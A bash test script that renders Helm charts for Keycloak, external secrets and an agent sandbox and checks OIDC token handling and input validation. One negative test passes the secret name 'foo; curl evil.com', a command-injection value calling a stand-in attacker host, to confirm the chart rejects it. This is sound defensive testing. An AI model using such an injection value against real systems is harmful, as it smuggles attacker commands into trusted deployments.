#!/usr/bin/env bash
# Offline validation: verify all OIDC-related chart templates render correctly.
# Requires: helm.
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
REPO_ROOT="$(cd "${SCRIPT_DIR}/.." && pwd)"
CHARTS_DIR="${REPO_ROOT}/charts"
PASS=0
FAIL=0
ERRORS=""

run_test() {
  local name="$1"; shift
  echo -n "  ${name}... "
  local output
  if output=$("$@" 2>&1); then
    echo "OK"
    PASS=$((PASS + 1))
  else
    echo "FAILED"
    ERRORS="${ERRORS}\n--- ${name} ---\n${output}\n"
    FAIL=$((FAIL + 1))
  fi
}

assert_contains() {
  local output="$1" pattern="$2" desc="$3"
  echo -n "  ${desc}... "
  if echo "${output}" | grep -qE "${pattern}"; then
    echo "OK"
    PASS=$((PASS + 1))
  else
    echo "FAILED (pattern '${pattern}' not found)"
    FAIL=$((FAIL + 1))
  fi
}

assert_not_contains() {
  local output="$1" pattern="$2" desc="$3"
  echo -n "  ${desc}... "
  if echo "${output}" | grep -qE "${pattern}"; then
    echo "FAILED (pattern '${pattern}' found but should not be)"
    FAIL=$((FAIL + 1))
  else
    echo "OK"
    PASS=$((PASS + 1))
  fi
}

run_test_should_fail() {
  local name="$1"; shift
  echo -n "  ${name}... "
  local output
  if output=$("$@" 2>&1); then
    echo "FAILED (expected failure but succeeded)"
    FAIL=$((FAIL + 1))
  else
    echo "OK (failed as expected)"
    PASS=$((PASS + 1))
  fi
}

SSH_KEY="ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAI test@test"

# ============================================================
echo "=== Keycloak Chart (operator-based) ==="
# ============================================================

run_test "renders with defaults" \
  helm template openshell-keycloak "${CHARTS_DIR}/openshell-keycloak" --namespace openshell-agents

KC_OUTPUT="$(helm template openshell-keycloak "${CHARTS_DIR}/openshell-keycloak" --namespace openshell-agents 2>&1)"
assert_contains "${KC_OUTPUT}" "kind: Keycloak" "Keycloak CR created"
assert_contains "${KC_OUTPUT}" "kind: KeycloakRealmImport" "KeycloakRealmImport CR created"
assert_contains "${KC_OUTPUT}" "openshell-cli" "CLI client configured"
assert_contains "${KC_OUTPUT}" "openshell-user" "user role defined"
assert_contains "${KC_OUTPUT}" "openshell-admin" "admin role defined"
assert_contains "${KC_OUTPUT}" "developer@openshell.local" "test user 'developer' present"
assert_contains "${KC_OUTPUT}" "admin@openshell.local" "test user 'admin' present"
assert_contains "${KC_OUTPUT}" "alice@openshell.local" "test user 'alice' present"
assert_contains "${KC_OUTPUT}" "bob@openshell.local" "test user 'bob' present"
assert_contains "${KC_OUTPUT}" "pkce.code.challenge.method" "PKCE configured"
assert_contains "${KC_OUTPUT}" "device.authorization.grant.enabled" "device code flow enabled"
assert_contains "${KC_OUTPUT}" "registrationAllowed.*true" "user registration enabled"
assert_contains "${KC_OUTPUT}" "keycloakCRName" "realm import references Keycloak CR"

# ============================================================
echo ""
echo "=== Pattern Secrets Chart ==="
# ============================================================

run_test "renders with defaults" \
  helm template pattern-secrets "${CHARTS_DIR}/pattern-secrets" --namespace openshell-agents

PS_OUTPUT="$(helm template pattern-secrets "${CHARTS_DIR}/pattern-secrets" --namespace openshell-agents 2>&1)"
assert_contains "${PS_OUTPUT}" "kind: ExternalSecret" "ExternalSecret resources created"
assert_contains "${PS_OUTPUT}" "name: inference" "unified inference secret defined"
assert_contains "${PS_OUTPUT}" "name: openshell-ssh-pubkey" "SSH public key secret defined"
assert_contains "${PS_OUTPUT}" "name: openshell-aap-ssh" "SSH private key secret defined"
assert_contains "${PS_OUTPUT}" "vault-backend" "vault backend referenced"

# ============================================================
echo ""
echo "=== Sandbox Chart (no OIDC) ==="
# ============================================================

SB_DEFAULT="$(helm template my-sandbox "${CHARTS_DIR}/openshell-saw" \
  --set sandboxName=my-sandbox \
  --set sshPublicKey="${SSH_KEY}" \
  --set inference.provider=gemini \
  --set inference.model=flash \
  --set inference.apiKey=test-key 2>&1)"
run_test "renders without OIDC" \
  helm template my-sandbox "${CHARTS_DIR}/openshell-saw" \
    --set sandboxName=my-sandbox \
    --set sshPublicKey="${SSH_KEY}" \
    --set inference.provider=gemini \
    --set inference.model=flash \
    --set inference.apiKey=test-key

assert_not_contains "${SB_DEFAULT}" "OIDC_TOKEN=ey" "no OIDC token value in setup-env secret"
assert_contains "${SB_DEFAULT}" "NEMOCLAW_PROVIDER=gemini" "provider set in env"
assert_contains "${SB_DEFAULT}" "NEMOCLAW_MODEL=flash" "model set in env"
assert_contains "${SB_DEFAULT}" "NEMOCLAW_API_KEY=test-key" "API key set in env"

# ============================================================
echo ""
echo "=== Sandbox Chart (with OIDC) ==="
# ============================================================

SB_OIDC="$(helm template my-sandbox "${CHARTS_DIR}/openshell-saw" \
  --set sandboxName=my-sandbox \
  --set sshPublicKey="${SSH_KEY}" \
  --set inference.provider=gemini \
  --set inference.model=flash \
  --set inference.apiKey=test-key \
  --set-string oidc.token=eyJhbGciOiJSUzI1NiJ9.test 2>&1)"
run_test "renders with OIDC token" \
  helm template my-sandbox "${CHARTS_DIR}/openshell-saw" \
    --set sandboxName=my-sandbox \
    --set sshPublicKey="${SSH_KEY}" \
    --set inference.provider=gemini \
    --set inference.model=flash \
    --set inference.apiKey=test-key \
    --set-string oidc.token=eyJhbGciOiJSUzI1NiJ9.test

assert_contains "${SB_OIDC}" "OIDC_TOKEN=eyJhbGciOiJSUzI1NiJ9.test" "OIDC token in setup env"
assert_contains "${SB_OIDC}" "OIDC_PASSTHROUGH=true" "OIDC passthrough enabled"
assert_contains "${SB_OIDC}" 'export OIDC_TOKEN' "OIDC token exported in run-create.sh"
assert_contains "${SB_OIDC}" "/sandbox/.oidc/token.json" "OIDC token written to sandbox"
assert_contains "${SB_OIDC}" "oidc_token.json" "OIDC token written to CLI token store"
assert_contains "${SB_OIDC}" 'access_token' "OIDC token file contains access_token JSON key"
assert_contains "${SB_OIDC}" 'OIDC_ISSUER' "OIDC issuer exported"
assert_contains "${SB_OIDC}" 'OIDC_CLIENT_ID' "OIDC client_id exported"

# ============================================================
echo ""
echo "=== Sandbox Chart (with ESO provider secret) ==="
# ============================================================

SB_ESO="$(helm template my-sandbox "${CHARTS_DIR}/openshell-saw" \
  --set sandboxName=my-sandbox \
  --set sshPublicKey="${SSH_KEY}" \
  --set inference.provider=gemini \
  --set inference.model=flash \
  --set inference.secretName=gemini 2>&1)"
run_test "renders with ESO provider secret" \
  helm template my-sandbox "${CHARTS_DIR}/openshell-saw" \
    --set sandboxName=my-sandbox \
    --set sshPublicKey="${SSH_KEY}" \
    --set inference.provider=gemini \
    --set inference.model=flash \
    --set inference.secretName=gemini

assert_contains "${SB_ESO}" "secretName: gemini" "provider secret mounted in job"
assert_contains "${SB_ESO}" "/provider-secret" "provider secret mount path present"
assert_contains "${SB_ESO}" "provider-secret/api_key" "API key read from provider secret"

# ============================================================
echo ""
echo "=== Secret Name Validation ==="
# ============================================================

run_test "accepts valid sshSecret name" \
  helm template my-sandbox "${CHARTS_DIR}/openshell-saw" \
    --set sandboxName=my-sandbox \
    --set sshPublicKey="${SSH_KEY}" \
    --set sshSecret=openshell-aap-ssh

run_test "accepts valid inference secretName" \
  helm template my-sandbox "${CHARTS_DIR}/openshell-saw" \
    --set sandboxName=my-sandbox \
    --set sshPublicKey="${SSH_KEY}" \
    --set inference.secretName=my-inference-secret

run_test_should_fail "rejects sshSecret with shell injection" \
  helm template my-sandbox "${CHARTS_DIR}/openshell-saw" \
    --set sandboxName=my-sandbox \
    --set sshPublicKey="${SSH_KEY}" \
    --set 'sshSecret=foo; curl evil.com'

run_test_should_fail "rejects inference secretName with spaces" \
  helm template my-sandbox "${CHARTS_DIR}/openshell-saw" \
    --set sandboxName=my-sandbox \
    --set sshPublicKey="${SSH_KEY}" \
    --set 'inference.secretName=bad name'

run_test_should_fail "rejects sshSecret starting with dash" \
  helm template my-sandbox "${CHARTS_DIR}/openshell-saw" \
    --set sandboxName=my-sandbox \
    --set sshPublicKey="${SSH_KEY}" \
    --set sshSecret=-invalid

run_test_should_fail "rejects release name longer than 19 characters" \
  helm template this-name-is-20chars "${CHARTS_DIR}/openshell-saw" \
    --set sandboxName=my-sandbox \
    --set sshPublicKey="${SSH_KEY}"

run_test_should_fail "rejects sandboxName value longer than 19 characters" \
  helm template my-sandbox "${CHARTS_DIR}/openshell-saw" \
    --set sandboxName=this-name-is-20chars \
    --set sshPublicKey="${SSH_KEY}"

run_test "accepts sandbox name exactly 19 characters" \
  helm template this-is-19-chars-xx "${CHARTS_DIR}/openshell-saw" \
    --set sandboxName=this-is-19-chars-xx \
    --set sshPublicKey="${SSH_KEY}"

# ============================================================
echo ""
echo "=== Summary ==="
echo "${PASS} passed, ${FAIL} failed"
if (( FAIL > 0 )); then
  echo ""
  echo "Failures:"
  echo -e "${ERRORS}"
  exit 1
fi
echo "All template tests passed."
